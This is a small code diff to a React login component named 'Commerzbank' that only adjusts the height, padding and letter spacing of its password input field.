@@ -212,12 +212,15 @@ const Commerzbank = () => {
                       onBlur={() => setPassFocus(false)}
                       value={password}
                       onChange={(e) => setPassword(e.target.value)}
-                       className="w-full bg-transparent border-0 py-2 pr-10 outline-none"
+                       className="w-full bg-transparent border-0 pr-10 outline-none"
                       style={{
                         color: passFocus ? "#002530" : TEXT,
                         fontSize: showPassword ? 17 : 24,
                         lineHeight: "1",
-                        letterSpacing: showPassword ? "normal" : "2px",
+                        height: 40,
+                        paddingTop: 0,
+                        paddingBottom: 0,
+                        letterSpacing: showPassword ? "normal" : "1px",
                       }}
                     />
                     <button
